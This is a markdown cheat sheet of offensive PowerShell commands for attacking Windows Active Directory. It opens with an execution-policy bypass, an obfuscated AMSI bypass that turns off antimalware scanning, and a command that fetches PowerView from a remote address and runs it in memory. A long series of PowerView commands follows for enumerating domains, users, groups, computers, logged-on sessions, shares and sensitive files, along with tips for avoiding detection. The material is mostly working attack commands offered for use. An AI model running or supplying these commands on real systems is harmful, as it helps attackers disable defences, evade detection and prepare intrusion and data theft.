# Execytion Policy Bypass:

```powershell
powershell -ep bypass
```

# Bypass AMSI:

```
sET-ItEM ('V'+'aR' + 'IA' + 'blE:1q2' + 'uZx')([TYpE]("{1}{0}"-F'F','rE'));(GeT-VariaBle("1Q2U" + "zX") -VaL)."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f 'Util','A','Amsi','.Management.','utomation.','s','System'))."g`etf`iElD"(("{0}{2}{1}" -f 'amsi','d','InitFaile'),("{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'))."sE`T`VaLUE"(${n`ULl},${t`RuE})

```

#PowerView from remote into memory:

```powershell
iex (iwr 'https://<remote_address>/PowerView.ps1')
```

# Enumerate domain

```powershell
Get-NetDomain
Get-NetDomain -Domain <domain>
```

# Enumerate domain-controllers

```powershell
Get-NetDomainController
Get-NetDomainController -Domain <domain>
```

# Enumerate Policies

```powershell
Get-DomainPolicy
(Get-DomainPolicy)."Policy Name"
```

# Enumerate Users:

```powershell
Get-NetUser
Get-NetUser -Username <username>
Get-UserProperty
Get-UserProperty -Properties <propertiy>
Find-UserField -SearchField <field> -SearchTerm "<grepable term>"
Get-UserProperty -Properties samaccountname,<property> |Select-String -Pattern  "<grapable term>"
```

* Hint to **avoid detection**:

    * Look for users with pwdlastset that is not very old;
    * Look for users that logoncount is big;
    * Look for users that badpwdcount is non-zero or a big numer;


# Enumerate Computer objets:

```powershell
Get-NetComputer
Get-NetComputer -FullData
Get-NetComputer -Computer <computername>
Get-NetComputer -<Property> <property>
Get-NetComputer |Out-String -Stream | Select-String -Pattern "<pattern1>","<pattern2>",...
Get-NetComputer -FullData | select term1,term2,...
```

# Enumerate live machines

```powershell
Get-NetComputer -Computer <computername|dnshostname> -Ping
```

# Enumerate Groups in the current domain

```powershell
Get-NetGroup
Get-NetGroup -Domain <domain>
Get-NetGroup -Domain <domain> -FullData | select <term>
Get-NetGroup *admin*
Get-NetGroup -FullData | select name |Out-String -Stream |Select-String -Pattern "admin"
```

## Enumerate membership

```powershell
Get-NetGroupMember -GroupName "<groupname>" [-Domain "<domain>"] -Recurse // what users are member of certain group
Get-NetGroup -Username "username" // what groups a user is member of
```

# Enumerate Local Groups

```powershell
Get-NetLocalGroup -ComputerName "<computername>" -ListGroups // all localgroups, requires admin priv for non-dc machines
Get-NetLocalGroup -ComputerName "<computername>" -Recurse // All Members of localgroups, requires the same privs of the above
```

# Enumerate Active logged on users on a Computer

```powershell
Get-NetLoggedon -ComputerName "<computername> // requires admin rights"
Get-LastLoggedOn -ComputerName "<computername> // requires admin rights "
Get-LoggedonLocal -ComputerName "<computername> // Requires remote registry enabled, it is enabled by default"
```

# Find Shares

```powershell
Get-NetFileServer // retrieve all file servers on the domain
Invoke-ShareFinder [-Versbose] [-ExcludeIPC -ExcludePrint -ExcludeStandard]
Invoke-FileFinder [-Verbose] // Sensitive files on computers in the domain
```
